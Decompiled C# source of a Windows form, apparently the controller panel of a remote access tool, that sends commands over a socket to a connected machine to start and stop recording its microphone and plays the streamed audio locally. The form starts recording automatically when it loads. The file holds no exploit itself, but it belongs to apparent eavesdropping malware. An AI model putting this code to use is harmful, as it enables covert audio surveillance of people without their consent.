using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using ClientG.My;
using Microsoft.VisualBasic.CompilerServices;
using WinMM;

namespace ClientG;

[DesignerGenerated]
public class MicrophoneGR : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("DV")]
	private ComboBox _DV;

	[AccessedThroughProperty("BZ")]
	private ComboBox _BZ;

	[AccessedThroughProperty("CT")]
	private ComboBox _CT;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("StartRec")]
	private Button _StartRec;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	public int sock;

	private WaveOut SP;

	internal virtual ComboBox DV
	{
		[DebuggerNonUserCode]
		get
		{
			return _DV;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_DV = value;
		}
	}

	internal virtual ComboBox BZ
	{
		[DebuggerNonUserCode]
		get
		{
			return _BZ;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_BZ = value;
		}
	}

	internal virtual ComboBox CT
	{
		[DebuggerNonUserCode]
		get
		{
			return _CT;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CT = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Button StartRec
	{
		[DebuggerNonUserCode]
		get
		{
			return _StartRec;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StartRec_Click;
			if (_StartRec != null)
			{
				((Control)_StartRec).remove_Click(eventHandler);
			}
			_StartRec = value;
			if (_StartRec != null)
			{
				((Control)_StartRec).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboBox1 = value;
		}
	}

	[DebuggerNonUserCode]
	public MicrophoneGR()
	{
		((Form)this).add_Load((EventHandler)Microphone_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_064a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0654: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(MicrophoneGR));
		DV = new ComboBox();
		BZ = new ComboBox();
		CT = new ComboBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		StartRec = new Button();
		Label5 = new Label();
		ComboBox1 = new ComboBox();
		((Control)this).SuspendLayout();
		DV.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)DV).set_FormattingEnabled(true);
		ComboBox dV = DV;
		Point location = new Point(108, 37);
		((Control)dV).set_Location(location);
		((Control)DV).set_Name("DV");
		ComboBox dV2 = DV;
		Size size = new Size(237, 21);
		((Control)dV2).set_Size(size);
		((Control)DV).set_TabIndex(0);
		BZ.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)BZ).set_FormattingEnabled(true);
		BZ.get_Items().AddRange(new object[14]
		{
			"4 kb - 8bit", "4 kb - 16bit", "6 kb - 8bit", "6 kb - 16bit", "8 kb - 8bit", "8 kb - 16bit", "12 kb - 8bit", "12 kb - 16bit", "16 kb - 8bit", "16 kb - 16bit",
			"20 kb - 8bit", "20 kb - 16bit", "24 kb - 8bit", "24 kb - 16bit"
		});
		ComboBox bZ = BZ;
		location = new Point(108, 64);
		((Control)bZ).set_Location(location);
		((Control)BZ).set_Name("BZ");
		ComboBox bZ2 = BZ;
		size = new Size(237, 21);
		((Control)bZ2).set_Size(size);
		((Control)BZ).set_TabIndex(1);
		CT.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)CT).set_FormattingEnabled(true);
		CT.get_Items().AddRange(new object[2] { "Stereo", "Mono" });
		ComboBox cT = CT;
		location = new Point(108, 91);
		((Control)cT).set_Location(location);
		((Control)CT).set_Name("CT");
		ComboBox cT2 = CT;
		size = new Size(237, 21);
		((Control)cT2).set_Size(size);
		((Control)CT).set_TabIndex(2);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(20, 40);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(47, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_Text("Device :");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(20, 67);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(64, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Buffer Size :");
		Label3.set_AutoSize(true);
		Label label5 = Label3;
		location = new Point(20, 94);
		((Control)label5).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label6 = Label3;
		size = new Size(52, 13);
		((Control)label6).set_Size(size);
		((Control)Label3).set_TabIndex(5);
		Label3.set_Text("Channel :");
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(27, 123);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(13, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(6);
		Label4.set_Text("--");
		Button startRec = StartRec;
		location = new Point(270, 123);
		((Control)startRec).set_Location(location);
		((Control)StartRec).set_Name("StartRec");
		Button startRec2 = StartRec;
		size = new Size(75, 23);
		((Control)startRec2).set_Size(size);
		((Control)StartRec).set_TabIndex(7);
		((ButtonBase)StartRec).set_Text("...");
		((ButtonBase)StartRec).set_UseVisualStyleBackColor(true);
		Label5.set_AutoSize(true);
		Label label9 = Label5;
		location = new Point(20, 13);
		((Control)label9).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label10 = Label5;
		size = new Size(82, 13);
		((Control)label10).set_Size(size);
		((Control)Label5).set_TabIndex(9);
		Label5.set_Text("Output Device :");
		ComboBox1.set_DropDownStyle((ComboBoxStyle)2);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		location = new Point(108, 10);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		size = new Size(237, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(8);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(365, 157);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Control)this).get_Controls().Add((Control)(object)StartRec);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)CT);
		((Control)this).get_Controls().Add((Control)(object)BZ);
		((Control)this).get_Controls().Add((Control)(object)DV);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Microphone");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Microphone");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public int RAUD(string DVN)
	{
		int deviceId = default(int);
		try
		{
			IEnumerator<WaveOutDeviceCaps> enumerator = WaveOut.get_Devices().GetEnumerator();
			while (enumerator.MoveNext())
			{
				WaveOutDeviceCaps current = enumerator.Current;
				if (Operators.CompareString(current.get_Name(), DVN, false) == 0)
				{
					deviceId = current.get_DeviceId();
					return deviceId;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		return deviceId;
	}

	private void Microphone_Load(object sender, EventArgs e)
	{
		try
		{
			foreach (WaveOutDeviceCaps device in WaveOut.get_Devices())
			{
				ComboBox1.get_Items().Add((object)device.get_Name());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ComboBox1.set_SelectedIndex(0);
		StartRec.PerformClick();
	}

	public object RS(byte[] D)
	{
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		object result = default(object);
		if (Operators.CompareString(((ButtonBase)StartRec).get_Text(), "Stop", false) == 0)
		{
			try
			{
				SP = new WaveOut(RAUD(ComboBox1.get_Items().get_Item(ComboBox1.get_SelectedIndex()).ToString()));
				SP.Open(WF());
				SP.Write(D);
				Label4.set_Text(SocketServer.GetSize(checked((ulong)D.Length)));
				return result;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				MessageBox.Show(ex2.ToString());
				ProjectData.ClearProjectError();
				return result;
			}
		}
		return result;
	}

	public WaveFormat WF()
	{
		if ((CT.get_SelectedIndex() == 0) & BZ.get_Items().get_Item(BZ.get_SelectedIndex()).ToString()!.Contains(" - 16bit"))
		{
			return WaveFormat.get_Pcm44Khz16BitStereo();
		}
		if ((CT.get_SelectedIndex() == 0) & BZ.get_Items().get_Item(BZ.get_SelectedIndex()).ToString()!.Contains(" - 8bit"))
		{
			return WaveFormat.get_Pcm44Khz8BitStereo();
		}
		if ((CT.get_SelectedIndex() == 1) & BZ.get_Items().get_Item(BZ.get_SelectedIndex()).ToString()!.Contains(" - 16bit"))
		{
			return WaveFormat.get_Pcm44Khz16BitMono();
		}
		if ((CT.get_SelectedIndex() == 1) & BZ.get_Items().get_Item(BZ.get_SelectedIndex()).ToString()!.Contains(" - 8bit"))
		{
			return WaveFormat.get_Pcm44Khz8BitMono();
		}
		WaveFormat result = default(WaveFormat);
		return result;
	}

	private void StartRec_Click(object sender, EventArgs e)
	{
		if (Operators.CompareString(((ButtonBase)StartRec).get_Text(), "Start", false) == 0)
		{
			((ButtonBase)StartRec).set_Text("Stop");
			bool flag = BZ.get_Items().get_Item(BZ.get_SelectedIndex()).ToString()!.Contains(" - 8bit");
			MyProject.Forms.FrmMAINGR.s.Send(sock, "STRC" + MyProject.Forms.FrmMAINGR.Key + DV.get_Items().get_Item(DV.get_SelectedIndex()).ToString() + MyProject.Forms.FrmMAINGR.Key + Conversions.ToString(flag) + MyProject.Forms.FrmMAINGR.Key + Conversions.ToString(checked(Conversions.ToInteger(BZ.get_Text().Split(new char[1] { ' ' })[0]) * 1024)) + MyProject.Forms.FrmMAINGR.Key + Conversions.ToString(CT.get_SelectedIndex()));
			((Control)DV).set_Enabled(false);
			((Control)BZ).set_Enabled(false);
			((Control)CT).set_Enabled(false);
			((Control)ComboBox1).set_Enabled(false);
		}
		else
		{
			((Control)DV).set_Enabled(true);
			((Control)BZ).set_Enabled(true);
			((Control)CT).set_Enabled(true);
			((Control)ComboBox1).set_Enabled(true);
			((ButtonBase)StartRec).set_Text("Start");
			Label4.set_Text("..");
			MyProject.Forms.FrmMAINGR.s.Send(sock, "SRC");
		}
	}
}
